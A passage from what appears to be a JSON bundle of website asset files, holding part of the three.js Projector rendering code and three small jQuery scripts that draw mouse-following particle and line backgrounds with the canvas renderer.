);\n\t\t\t\t_face.normalModel.applyMatrix3( normalMatrix ).normalize();\n\n\t\t\t\tfor ( var i = 0; i < 3; i ++ ) {\n\n\t\t\t\t\tvar normal = _face.vertexNormalsModel[ i ];\n\t\t\t\t\tnormal.fromArray( normals, arguments[ i ] * 3 );\n\t\t\t\t\tnormal.applyMatrix3( normalMatrix ).normalize();\n\n\t\t\t\t\tvar uv = _face.uvs[ i ];\n\t\t\t\t\tuv.fromArray( uvs, arguments[ i ] * 2 );\n\n\t\t\t\t}\n\n\t\t\t\t_face.vertexNormalsLength = 3;\n\n\t\t\t\t_face.material = object.material;\n\n\t\t\t\t_renderData.elements.push( _face );\n\n\t\t\t}\n\n\t\t}\n\n\t\treturn {\n\t\t\tsetObject: setObject,\n\t\t\tprojectVertex: projectVertex,\n\t\t\tcheckTriangleVisibility: checkTriangleVisibility,\n\t\t\tcheckBackfaceCulling: checkBackfaceCulling,\n\t\t\tpushVertex: pushVertex,\n\t\t\tpushNormal: pushNormal,\n\t\t\tpushUv: pushUv,\n\t\t\tpushLine: pushLine,\n\t\t\tpushTriangle: pushTriangle\n\t\t}\n\n\t};\n\n\tvar renderList = new RenderList();\n\n\tthis.projectScene = function ( scene, camera, sortObjects, sortElements ) {\n\n\t\t_faceCount = 0;\n\t\t_lineCount = 0;\n\t\t_spriteCount = 0;\n\n\t\t_renderData.elements.length = 0;\n\n\t\tif ( scene.autoUpdate === true ) scene.updateMatrixWorld();\n\t\tif ( camera.parent === null ) camera.updateMatrixWorld();\n\n\t\t_viewMatrix.copy( camera.matrixWorldInverse.getInverse( camera.matrixWorld ) );\n\t\t_viewProjectionMatrix.multiplyMatrices( camera.projectionMatrix, _viewMatrix );\n\n\t\t_frustum.setFromMatrix( _viewProjectionMatrix );\n\n\t\t//\n\n\t\t_objectCount = 0;\n\n\t\t_renderData.objects.length = 0;\n\t\t_renderData.lights.length = 0;\n\n\t\tfunction addObject( object ) {\n\n\t\t\t_object = getNextObjectInPool();\n\t\t\t_object.id = object.id;\n\t\t\t_object.object = object;\n\n\t\t\t_vector3.setFromMatrixPosition( object.matrixWorld );\n\t\t\t_vector3.applyMatrix4( _viewProjectionMatrix );\n\t\t\t_object.z = _vector3.z;\n\t\t\t_object.renderOrder = object.renderOrder;\n\n\t\t\t_renderData.objects.push( _object );\n\n\t\t}\n\n\t\tscene.traverseVisible( function ( object ) {\n\n\t\t\tif ( object instanceof THREE.Light ) {\n\n\t\t\t\t_renderData.lights.push( object );\n\n\t\t\t} else if ( object instanceof THREE.Mesh || object instanceof THREE.Line ) {\n\n\t\t\t\tif ( object.material.visible === false ) return;\n\t\t\t\tif ( object.frustumCulled === true && _frustum.intersectsObject( object ) === false ) return;\n\n\t\t\t\taddObject( object );\n\n\t\t\t} else if ( object instanceof THREE.Sprite ) {\n\n\t\t\t\tif ( object.material.visible === false ) return;\n\t\t\t\tif ( object.frustumCulled === true && _frustum.intersectsSprite( object ) === false ) return;\n\n\t\t\t\taddObject( object );\n\n\t\t\t}\n\n\t\t} );\n\n\t\tif ( sortObjects === true ) {\n\n\t\t\t_renderData.objects.sort( painterSort );\n\n\t\t}\n\n\t\t//\n\n\t\tfor ( var o = 0, ol = _renderData.objects.length; o < ol; o ++ ) {\n\n\t\t\tvar object = _renderData.objects[ o ].object;\n\t\t\tvar geometry = object.geometry;\n\n\t\t\trenderList.setObject( object );\n\n\t\t\t_modelMatrix = object.matrixWorld;\n\n\t\t\t_vertexCount = 0;\n\n\t\t\tif ( object instanceof THREE.Mesh ) {\n\n\t\t\t\tif ( geometry instanceof THREE.BufferGeometry ) {\n\n\t\t\t\t\tvar attributes = geometry.attributes;\n\t\t\t\t\tvar groups = geometry.groups;\n\n\t\t\t\t\tif ( attributes.position === undefined ) continue;\n\n\t\t\t\t\tvar positions = attributes.position.array;\n\n\t\t\t\t\tfor ( var i = 0, l = positions.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\trenderList.pushVertex( positions[ i ], positions[ i + 1 ], positions[ i + 2 ] );\n\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( attributes.normal !== undefined ) {\n\n\t\t\t\t\t\tvar normals = attributes.normal.array;\n\n\t\t\t\t\t\tfor ( var i = 0, l = normals.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\trenderList.pushNormal( normals[ i ], normals[ i + 1 ], normals[ i + 2 ] );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( attributes.uv !== undefined ) {\n\n\t\t\t\t\t\tvar uvs = attributes.uv.array;\n\n\t\t\t\t\t\tfor ( var i = 0, l = uvs.length; i < l; i += 2 ) {\n\n\t\t\t\t\t\t\trenderList.pushUv( uvs[ i ], uvs[ i + 1 ] );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t\tif ( geometry.index !== null ) {\n\n\t\t\t\t\t\tvar indices = geometry.index.array;\n\n\t\t\t\t\t\tif ( groups.length > 0 ) {\n\n\t\t\t\t\t\t\tfor ( var g = 0; g < groups.length; g ++ ) {\n\n\t\t\t\t\t\t\t\tvar group = groups[ g ];\n\n\t\t\t\t\t\t\t\tfor ( var i = group.start, l = group.start + group.count; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\t\t\trenderList.pushTriangle( indices[ i ], indices[ i + 1 ], indices[ i + 2 ] );\n\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t} else {\n\n\t\t\t\t\t\t\tfor ( var i = 0, l = indices.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\t\trenderList.pushTriangle( indices[ i ], indices[ i + 1 ], indices[ i + 2 ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t} else {\n\n\t\t\t\t\t\tfor ( var i = 0, l = positions.length / 3; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\trenderList.pushTriangle( i, i + 1, i + 2 );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t} else if ( geometry instanceof THREE.Geometry ) {\n\n\t\t\t\t\tvar vertices = geometry.vertices;\n\t\t\t\t\tvar faces = geometry.faces;\n\t\t\t\t\tvar faceVertexUvs = geometry.faceVertexUvs[ 0 ];\n\n\t\t\t\t\t_normalMatrix.getNormalMatrix( _modelMatrix );\n\n\t\t\t\t\tvar material = object.material;\n\n\t\t\t\t\tvar isFaceMaterial = material instanceof THREE.MultiMaterial;\n\t\t\t\t\tvar objectMaterials = isFaceMaterial === true ? object.material : null;\n\n\t\t\t\t\tfor ( var v = 0, vl = vertices.length; v < vl; v ++ ) {\n\n\t\t\t\t\t\tvar vertex = vertices[ v ];\n\n\t\t\t\t\t\t_vector3.copy( vertex );\n\n\t\t\t\t\t\tif ( material.morphTargets === true ) {\n\n\t\t\t\t\t\t\tvar morphTargets = geometry.morphTargets;\n\t\t\t\t\t\t\tvar morphInfluences = object.morphTargetInfluences;\n\n\t\t\t\t\t\t\tfor ( var t = 0, tl = morphTargets.length; t < tl; t ++ ) {\n\n\t\t\t\t\t\t\t\tvar influence = morphInfluences[ t ];\n\n\t\t\t\t\t\t\t\tif ( influence === 0 ) continue;\n\n\t\t\t\t\t\t\t\tvar target = morphTargets[ t ];\n\t\t\t\t\t\t\t\tvar targetVertex = target.vertices[ v ];\n\n\t\t\t\t\t\t\t\t_vector3.x += ( targetVertex.x - vertex.x ) * influence;\n\t\t\t\t\t\t\t\t_vector3.y += ( targetVertex.y - vertex.y ) * influence;\n\t\t\t\t\t\t\t\t_vector3.z += ( targetVertex.z - vertex.z ) * influence;\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\trenderList.pushVertex( _vector3.x, _vector3.y, _vector3.z );\n\n\t\t\t\t\t}\n\n\t\t\t\t\tfor ( var f = 0, fl = faces.length; f < fl; f ++ ) {\n\n\t\t\t\t\t\tvar face = faces[ f ];\n\n\t\t\t\t\t\tmaterial = isFaceMaterial === true\n\t\t\t\t\t\t\t ? objectMaterials.materials[ face.materialIndex ]\n\t\t\t\t\t\t\t : object.material;\n\n\t\t\t\t\t\tif ( material === undefined ) continue;\n\n\t\t\t\t\t\tvar side = material.side;\n\n\t\t\t\t\t\tvar v1 = _vertexPool[ face.a ];\n\t\t\t\t\t\tvar v2 = _vertexPool[ face.b ];\n\t\t\t\t\t\tvar v3 = _vertexPool[ face.c ];\n\n\t\t\t\t\t\tif ( renderList.checkTriangleVisibility( v1, v2, v3 ) === false ) continue;\n\n\t\t\t\t\t\tvar visible = renderList.checkBackfaceCulling( v1, v2, v3 );\n\n\t\t\t\t\t\tif ( side !== THREE.DoubleSide ) {\n\n\t\t\t\t\t\t\tif ( side === THREE.FrontSide && visible === false ) continue;\n\t\t\t\t\t\t\tif ( side === THREE.BackSide && visible === true ) continue;\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face = getNextFaceInPool();\n\n\t\t\t\t\t\t_face.id = object.id;\n\t\t\t\t\t\t_face.v1.copy( v1 );\n\t\t\t\t\t\t_face.v2.copy( v2 );\n\t\t\t\t\t\t_face.v3.copy( v3 );\n\n\t\t\t\t\t\t_face.normalModel.copy( face.normal );\n\n\t\t\t\t\t\tif ( visible === false && ( side === THREE.BackSide || side === THREE.DoubleSide ) ) {\n\n\t\t\t\t\t\t\t_face.normalModel.negate();\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face.normalModel.applyMatrix3( _normalMatrix ).normalize();\n\n\t\t\t\t\t\tvar faceVertexNormals = face.vertexNormals;\n\n\t\t\t\t\t\tfor ( var n = 0, nl = Math.min( faceVertexNormals.length, 3 ); n < nl; n ++ ) {\n\n\t\t\t\t\t\t\tvar normalModel = _face.vertexNormalsModel[ n ];\n\t\t\t\t\t\t\tnormalModel.copy( faceVertexNormals[ n ] );\n\n\t\t\t\t\t\t\tif ( visible === false && ( side === THREE.BackSide || side === THREE.DoubleSide ) ) {\n\n\t\t\t\t\t\t\t\tnormalModel.negate();\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tnormalModel.applyMatrix3( _normalMatrix ).normalize();\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face.vertexNormalsLength = faceVertexNormals.length;\n\n\t\t\t\t\t\tvar vertexUvs = faceVertexUvs[ f ];\n\n\t\t\t\t\t\tif ( vertexUvs !== undefined ) {\n\n\t\t\t\t\t\t\tfor ( var u = 0; u < 3; u ++ ) {\n\n\t\t\t\t\t\t\t\t_face.uvs[ u ].copy( vertexUvs[ u ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t_face.color = face.color;\n\t\t\t\t\t\t_face.material = material;\n\n\t\t\t\t\t\t_face.z = ( v1.positionScreen.z + v2.positionScreen.z + v3.positionScreen.z ) / 3;\n\t\t\t\t\t\t_face.renderOrder = object.renderOrder;\n\n\t\t\t\t\t\t_renderData.elements.push( _face );\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t} else if ( object instanceof THREE.Line ) {\n\n\t\t\t\tif ( geometry instanceof THREE.BufferGeometry ) {\n\n\t\t\t\t\tvar attributes = geometry.attributes;\n\n\t\t\t\t\tif ( attributes.position !== undefined ) {\n\n\t\t\t\t\t\tvar positions = attributes.position.array;\n\n\t\t\t\t\t\tfor ( var i = 0, l = positions.length; i < l; i += 3 ) {\n\n\t\t\t\t\t\t\trenderList.pushVertex( positions[ i ], positions[ i + 1 ], positions[ i + 2 ] );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tif ( geometry.index !== null ) {\n\n\t\t\t\t\t\t\tvar indices = geometry.index.array;\n\n\t\t\t\t\t\t\tfor ( var i = 0, l = indices.length; i < l; i += 2 ) {\n\n\t\t\t\t\t\t\t\trenderList.pushLine( indices[ i ], indices[ i + 1 ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t} else {\n\n\t\t\t\t\t\t\tvar step = object instanceof THREE.LineSegments ? 2 : 1;\n\n\t\t\t\t\t\t\tfor ( var i = 0, l = ( positions.length / 3 ) - 1; i < l; i += step ) {\n\n\t\t\t\t\t\t\t\trenderList.pushLine( i, i + 1 );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t} else if ( geometry instanceof THREE.Geometry ) {\n\n\t\t\t\t\t_modelViewProjectionMatrix.multiplyMatrices( _viewProjectionMatrix, _modelMatrix );\n\n\t\t\t\t\tvar vertices = object.geometry.vertices;\n\n\t\t\t\t\tif ( vertices.length === 0 ) continue;\n\n\t\t\t\t\tv1 = getNextVertexInPool();\n\t\t\t\t\tv1.positionScreen.copy( vertices[ 0 ] ).applyMatrix4( _modelViewProjectionMatrix );\n\n\t\t\t\t\tvar step = object instanceof THREE.LineSegments ? 2 : 1;\n\n\t\t\t\t\tfor ( var v = 1, vl = vertices.length; v < vl; v ++ ) {\n\n\t\t\t\t\t\tv1 = getNextVertexInPool();\n\t\t\t\t\t\tv1.positionScreen.copy( vertices[ v ] ).applyMatrix4( _modelViewProjectionMatrix );\n\n\t\t\t\t\t\tif ( ( v + 1 ) % step > 0 ) continue;\n\n\t\t\t\t\t\tv2 = _vertexPool[ _vertexCount - 2 ];\n\n\t\t\t\t\t\t_clippedVertex1PositionScreen.copy( v1.positionScreen );\n\t\t\t\t\t\t_clippedVertex2PositionScreen.copy( v2.positionScreen );\n\n\t\t\t\t\t\tif ( clipLine( _clippedVertex1PositionScreen, _clippedVertex2PositionScreen ) === true ) {\n\n\t\t\t\t\t\t\t// Perform the perspective divide\n\t\t\t\t\t\t\t_clippedVertex1PositionScreen.multiplyScalar( 1 / _clippedVertex1PositionScreen.w );\n\t\t\t\t\t\t\t_clippedVertex2PositionScreen.multiplyScalar( 1 / _clippedVertex2PositionScreen.w );\n\n\t\t\t\t\t\t\t_line = getNextLineInPool();\n\n\t\t\t\t\t\t\t_line.id = object.id;\n\t\t\t\t\t\t\t_line.v1.positionScreen.copy( _clippedVertex1PositionScreen );\n\t\t\t\t\t\t\t_line.v2.positionScreen.copy( _clippedVertex2PositionScreen );\n\n\t\t\t\t\t\t\t_line.z = Math.max( _clippedVertex1PositionScreen.z, _clippedVertex2PositionScreen.z );\n\t\t\t\t\t\t\t_line.renderOrder = object.renderOrder;\n\n\t\t\t\t\t\t\t_line.material = object.material;\n\n\t\t\t\t\t\t\tif ( object.material.vertexColors === THREE.VertexColors ) {\n\n\t\t\t\t\t\t\t\t_line.vertexColors[ 0 ].copy( object.geometry.colors[ v ] );\n\t\t\t\t\t\t\t\t_line.vertexColors[ 1 ].copy( object.geometry.colors[ v - 1 ] );\n\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t_renderData.elements.push( _line );\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t} else if ( object instanceof THREE.Sprite ) {\n\n\t\t\t\t_vector4.set( _modelMatrix.elements[ 12 ], _modelMatrix.elements[ 13 ], _modelMatrix.elements[ 14 ], 1 );\n\t\t\t\t_vector4.applyMatrix4( _viewProjectionMatrix );\n\n\t\t\t\tvar invW = 1 / _vector4.w;\n\n\t\t\t\t_vector4.z *= invW;\n\n\t\t\t\tif ( _vector4.z >= - 1 && _vector4.z <= 1 ) {\n\n\t\t\t\t\t_sprite = getNextSpriteInPool();\n\t\t\t\t\t_sprite.id = object.id;\n\t\t\t\t\t_sprite.x = _vector4.x * invW;\n\t\t\t\t\t_sprite.y = _vector4.y * invW;\n\t\t\t\t\t_sprite.z = _vector4.z;\n\t\t\t\t\t_sprite.renderOrder = object.renderOrder;\n\t\t\t\t\t_sprite.object = object;\n\n\t\t\t\t\t_sprite.rotation = object.rotation;\n\n\t\t\t\t\t_sprite.scale.x = object.scale.x * Math.abs( _sprite.x - ( _vector4.x + camera.projectionMatrix.elements[ 0 ] ) / ( _vector4.w + camera.projectionMatrix.elements[ 12 ] ) );\n\t\t\t\t\t_sprite.scale.y = object.scale.y * Math.abs( _sprite.y - ( _vector4.y + camera.projectionMatrix.elements[ 5 ] ) / ( _vector4.w + camera.projectionMatrix.elements[ 13 ] ) );\n\n\t\t\t\t\t_sprite.material = object.material;\n\n\t\t\t\t\t_renderData.elements.push( _sprite );\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t}\n\n\t\tif ( sortElements === true ) {\n\n\t\t\t_renderData.elements.sort( painterSort );\n\n\t\t}\n\n\t\treturn _renderData;\n\n\t};\n\n\t// Pools\n\n\tfunction getNextObjectInPool() {\n\n\t\tif ( _objectCount === _objectPoolLength ) {\n\n\t\t\tvar object = new THREE.RenderableObject();\n\t\t\t_objectPool.push( object );\n\t\t\t_objectPoolLength ++;\n\t\t\t_objectCount ++;\n\t\t\treturn object;\n\n\t\t}\n\n\t\treturn _objectPool[ _objectCount ++ ];\n\n\t}\n\n\tfunction getNextVertexInPool() {\n\n\t\tif ( _vertexCount === _vertexPoolLength ) {\n\n\t\t\tvar vertex = new THREE.RenderableVertex();\n\t\t\t_vertexPool.push( vertex );\n\t\t\t_vertexPoolLength ++;\n\t\t\t_vertexCount ++;\n\t\t\treturn vertex;\n\n\t\t}\n\n\t\treturn _vertexPool[ _vertexCount ++ ];\n\n\t}\n\n\tfunction getNextFaceInPool() {\n\n\t\tif ( _faceCount === _facePoolLength ) {\n\n\t\t\tvar face = new THREE.RenderableFace();\n\t\t\t_facePool.push( face );\n\t\t\t_facePoolLength ++;\n\t\t\t_faceCount ++;\n\t\t\treturn face;\n\n\t\t}\n\n\t\treturn _facePool[ _faceCount ++ ];\n\n\n\t}\n\n\tfunction getNextLineInPool() {\n\n\t\tif ( _lineCount === _linePoolLength ) {\n\n\t\t\tvar line = new THREE.RenderableLine();\n\t\t\t_linePool.push( line );\n\t\t\t_linePoolLength ++;\n\t\t\t_lineCount ++;\n\t\t\treturn line;\n\n\t\t}\n\n\t\treturn _linePool[ _lineCount ++ ];\n\n\t}\n\n\tfunction getNextSpriteInPool() {\n\n\t\tif ( _spriteCount === _spritePoolLength ) {\n\n\t\t\tvar sprite = new THREE.RenderableSprite();\n\t\t\t_spritePool.push( sprite );\n\t\t\t_spritePoolLength ++;\n\t\t\t_spriteCount ++;\n\t\t\treturn sprite;\n\n\t\t}\n\n\t\treturn _spritePool[ _spriteCount ++ ];\n\n\t}\n\n\t//\n\n\tfunction painterSort( a, b ) {\n\n\t\tif ( a.renderOrder !== b.renderOrder ) {\n\n\t\t\treturn a.renderOrder - b.renderOrder;\n\n\t\t} else if ( a.z !== b.z ) {\n\n\t\t\treturn b.z - a.z;\n\n\t\t} else if ( a.id !== b.id ) {\n\n\t\t\treturn a.id - b.id;\n\n\t\t} else {\n\n\t\t\treturn 0;\n\n\t\t}\n\n\t}\n\n\tfunction clipLine( s1, s2 ) {\n\n\t\tvar alpha1 = 0, alpha2 = 1,\n\n\t\t// Calculate the boundary coordinate of each vertex for the near and far clip planes,\n\t\t// Z = -1 and Z = +1, respectively.\n\t\tbc1near =  s1.z + s1.w,\n\t\tbc2near =  s2.z + s2.w,\n\t\tbc1far =  - s1.z + s1.w,\n\t\tbc2far =  - s2.z + s2.w;\n\n\t\tif ( bc1near >= 0 && bc2near >= 0 && bc1far >= 0 && bc2far >= 0 ) {\n\n\t\t\t// Both vertices lie entirely within all clip planes.\n\t\t\treturn true;\n\n\t\t} else if ( ( bc1near < 0 && bc2near < 0 ) || ( bc1far < 0 && bc2far < 0 ) ) {\n\n\t\t\t// Both vertices lie entirely outside one of the clip planes.\n\t\t\treturn false;\n\n\t\t} else {\n\n\t\t\t// The line segment spans at least one clip plane.\n\n\t\t\tif ( bc1near < 0 ) {\n\n\t\t\t\t// v1 lies outside the near plane, v2 inside\n\t\t\t\talpha1 = Math.max( alpha1, bc1near / ( bc1near - bc2near ) );\n\n\t\t\t} else if ( bc2near < 0 ) {\n\n\t\t\t\t// v2 lies outside the near plane, v1 inside\n\t\t\t\talpha2 = Math.min( alpha2, bc1near / ( bc1near - bc2near ) );\n\n\t\t\t}\n\n\t\t\tif ( bc1far < 0 ) {\n\n\t\t\t\t// v1 lies outside the far plane, v2 inside\n\t\t\t\talpha1 = Math.max( alpha1, bc1far / ( bc1far - bc2far ) );\n\n\t\t\t} else if ( bc2far < 0 ) {\n\n\t\t\t\t// v2 lies outside the far plane, v2 inside\n\t\t\t\talpha2 = Math.min( alpha2, bc1far / ( bc1far - bc2far ) );\n\n\t\t\t}\n\n\t\t\tif ( alpha2 < alpha1 ) {\n\n\t\t\t\t// The line segment spans two boundaries, but is outside both of them.\n\t\t\t\t// (This can't happen when we're only clipping against just near/far but good\n\t\t\t\t//  to leave the check here for future usage if other clip planes are added.)\n\t\t\t\treturn false;\n\n\t\t\t} else {\n\n\t\t\t\t// Update the s1 and s2 vertices to match the clipped line segment.\n\t\t\t\ts1.lerp( s2, alpha1 );\n\t\t\t\ts2.lerp( s1, 1 - alpha2 );\n\n\t\t\t\treturn true;\n\n\t\t\t}\n\n\t\t}\n\n\t}\n\n};\n"},{"url":"/lib/three/src/canvas_lines.js","content":"/**\n * Created by Tang on 2017/4/15.\n */\n$(function () {\n  var mouseX = 0,\n    mouseY = 0,\n    windowHalfX = window.innerWidth / 2,\n    windowHalfY = window.innerHeight / 2,\n    SEPARATION = 200,\n    AMOUNTX = 10,\n    AMOUNTY = 10,\n    camera, scene, renderer;\n  init();\n  animate();\n\n  function init() {\n    var container, separation = 100,\n      amountX = 50,\n      amountY = 50,\n      particles, particle;\n    container = document.createElement('div');\n    // 设置css\n    container.style.position = \"fixed\";\n    container.style.top = \"0px\";\n    container.style.left = \"0px\";\n    container.style.zIndex = \"-1\";\n    container.style.opacity = \"0.5\";\n\n    document.body.appendChild(container);\n    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 10000);\n    camera.position.z = 100;\n    scene = new THREE.Scene();\n    renderer = new THREE.CanvasRenderer({\n      alpha: true\n    });\n    renderer.setPixelRatio(window.devicePixelRatio);\n    renderer.setSize(window.innerWidth, window.innerHeight);\n    container.appendChild(renderer.domElement);\n    // particles\n    var PI2 = Math.PI * 2;\n    var material = new THREE.SpriteCanvasMaterial({\n      color: 10263708,\n      program: function (context) {\n        context.beginPath();\n        context.arc(0, 0, 0.5, 0, PI2, true);\n        context.fill();\n      }\n    });\n    var geometry = new THREE.Geometry();\n    for (var i = 0; i < 100; i++) {\n      particle = new THREE.Sprite(material);\n      particle.position.x = Math.random() * 2 - 1;\n      particle.position.y = Math.random() * 2 - 1;\n      particle.position.z = Math.random() * 2 - 1;\n      particle.position.normalize();\n      particle.position.multiplyScalar(Math.random() * 10 + 450);\n      particle.scale.x = particle.scale.y = 10;\n      scene.add(particle);\n      geometry.vertices.push(particle.position);\n    }\n    // lines\n    var line = new THREE.Line(geometry, new THREE.LineBasicMaterial({\n      color: 10263708,\n      opacity: 0.5\n    }));\n    scene.add(line);\n    document.addEventListener('mousemove', onDocumentMouseMove, false);\n    document.addEventListener('touchstart', onDocumentTouchStart, false);\n    document.addEventListener('touchmove', onDocumentTouchMove, false);\n    //\n    window.addEventListener('resize', onWindowResize, false);\n  }\n\n  function onWindowResize() {\n    windowHalfX = window.innerWidth / 2;\n    windowHalfY = window.innerHeight / 2;\n    camera.aspect = window.innerWidth / window.innerHeight;\n    camera.updateProjectionMatrix();\n    renderer.setSize(window.innerWidth, window.innerHeight);\n  }\n  //\n  function onDocumentMouseMove(event) {\n    mouseX = event.clientX - windowHalfX;\n    mouseY = event.clientY - windowHalfY;\n  }\n\n  function onDocumentTouchStart(event) {\n    if (event.touches.length > 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n\n  function onDocumentTouchMove(event) {\n    if (event.touches.length == 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n  //\n  function animate() {\n    requestAnimationFrame(animate);\n    render();\n  }\n\n  function render() {\n    camera.position.x += (mouseX - camera.position.x) * .05;\n    camera.position.y += (-mouseY + 200 - camera.position.y) * .05;\n    camera.lookAt(scene.position);\n    renderer.render(scene, camera);\n  }\n})"},{"url":"/lib/three/src/canvas_sphere.js","content":"/**\n * Created by Tang on 2017/4/15.\n */\n$(function () {\n  var SCREEN_WIDTH = window.innerWidth,\n    SCREEN_HEIGHT = window.innerHeight,\n    mouseX = 0,\n    mouseY = 0,\n    windowHalfX = window.innerWidth / 2,\n    windowHalfY = window.innerHeight / 2,\n    SEPARATION = 200,\n    AMOUNTX = 10,\n    AMOUNTY = 10,\n    camera, scene, renderer;\n  init();\n  animate();\n\n  function init() {\n    var container, separation = 100,\n      amountX = 50,\n      amountY = 50,\n      particles, particle;\n    container = document.createElement('div');\n    // 设置css\n    container.style.position = \"fixed\";\n    container.style.top = \"0px\";\n    container.style.left = \"0px\";\n    container.style.zIndex = \"-1\";\n    container.style.opacity = \"0.5\";\n\n    document.body.appendChild(container);\n    camera = new THREE.PerspectiveCamera(75, SCREEN_WIDTH / SCREEN_HEIGHT, 1, 10000);\n    camera.position.z = 1000;\n    scene = new THREE.Scene();\n    renderer = new THREE.CanvasRenderer({\n      alpha: true\n    });\n    renderer.setPixelRatio(window.devicePixelRatio);\n    renderer.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);\n    container.appendChild(renderer.domElement);\n    // particles\n    var PI2 = Math.PI * 2;\n    var material = new THREE.SpriteCanvasMaterial({\n      color: 10263708,\n      program: function (context) {\n        context.beginPath();\n        context.arc(0, 0, 0.5, 0, PI2, true);\n        context.fill();\n      }\n    });\n    for (var i = 0; i < 1000; i++) {\n      particle = new THREE.Sprite(material);\n      particle.position.x = Math.random() * 2 - 1;\n      particle.position.y = Math.random() * 2 - 1;\n      particle.position.z = Math.random() * 2 - 1;\n      particle.position.normalize();\n      particle.position.multiplyScalar(Math.random() * 10 + 450);\n      particle.scale.multiplyScalar(2);\n      scene.add(particle);\n    }\n    // lines\n    for (var i = 0; i < 300; i++) {\n      var geometry = new THREE.Geometry();\n      var vertex = new THREE.Vector3(Math.random() * 2 - 1, Math.random() * 2 - 1, Math.random() * 2 - 1);\n      vertex.normalize();\n      vertex.multiplyScalar(450);\n      geometry.vertices.push(vertex);\n      var vertex2 = vertex.clone();\n      vertex2.multiplyScalar(Math.random() * 0.3 + 1);\n      geometry.vertices.push(vertex2);\n      var line = new THREE.Line(geometry, new THREE.LineBasicMaterial({\n        color: 10263708,\n        opacity: Math.random()\n      }));\n      scene.add(line);\n    }\n    document.addEventListener('mousemove', onDocumentMouseMove, false);\n    document.addEventListener('touchstart', onDocumentTouchStart, false);\n    document.addEventListener('touchmove', onDocumentTouchMove, false);\n    //\n    window.addEventListener('resize', onWindowResize, false);\n  }\n\n  function onWindowResize() {\n    windowHalfX = window.innerWidth / 2;\n    windowHalfY = window.innerHeight / 2;\n    camera.aspect = window.innerWidth / window.innerHeight;\n    camera.updateProjectionMatrix();\n    renderer.setSize(window.innerWidth, window.innerHeight);\n  }\n  //\n  function onDocumentMouseMove(event) {\n    mouseX = event.clientX - windowHalfX;\n    mouseY = event.clientY - windowHalfY;\n  }\n\n  function onDocumentTouchStart(event) {\n    if (event.touches.length > 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n\n  function onDocumentTouchMove(event) {\n    if (event.touches.length == 1) {\n      //event.preventDefault();\n      mouseX = event.touches[0].pageX - windowHalfX;\n      //mouseY = event.touches[ 0 ].pageY - windowHalfY;\n    }\n  }\n  //\n  function animate() {\n    requestAnimationFrame(animate);\n    render();\n  }\n\n  function render() {\n    camera.position.x += (mouseX - camera.position.x) * .05;\n    camera.position.y += (-mouseY + 200 - camera.position.y) * .05;\n    camera.lookAt(scene.position);\n    renderer.render(scene, camera);\n  }\n})"},{"url":"/lib/three/src/three-waves.js","content":"$(function () {\n  var SEPARATION = 100,\n    AMOUNTX = 50,\n    AMOUNTY = 50;\n  var container;\n  var camera, scene, renderer;\n  var particles, particle, count = 0;\n  var mouseX = 0,\n    mouseY = 0;\n  var windowHalfX = window.innerWidth / 2;\n  var windowHalfY = window.innerHeight / 2;\n  init();\n  animate();\n\n  function init() {\n    container = document.createElement(\"div\");\n    container.style.position = \"fixed\";\n    container.style.top = \"0px\";\n    container.style.left = \"0px\";\n    container.style.zIndex = \"-1\";\n    container.style.opacity = \"0.5\";\n    document.body.appendChild(container);\n    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 10000);\n    camera.position.z = 1000;\n    scene = new THREE.Scene();\n    particles = new Array();\n    var PI2 = Math.PI * 2;\n    var material = new THREE.SpriteCanvasMaterial({\n      color: 10263708,\n      program: function (context) {\n        context.beginPath();\n        context.arc(0, 0, 0.5, 0, PI2, true);\n        context.fill()\n      }\n    });\n    var i = 0;\n    for (var ix = 0; ix < AMOUNTX; ix++) {\n      for (var iy = 0; iy < AMOUNTY; iy++) {\n        particle = particles[i++] = new THREE.Sprite(material);\n        particle.position.x = ix * SEPARATION - ((AMOUNTX * SEPARATION) / 2);\n        particle.position.z = iy * SEPARATION - ((AMOUNTY * SEPARATION) / 2);\n        scene.add(particle)\n      }\n    }\n    renderer = new THREE.CanvasRenderer({\n      alpha: true\n    });\n    renderer.setPixelRatio(window.devicePixelRatio);\n    renderer.setSize(window.innerWidth, window.innerHeight);\n    container.appendChild(renderer.domElement);\n    document.addEventListener(\"mousemove\", 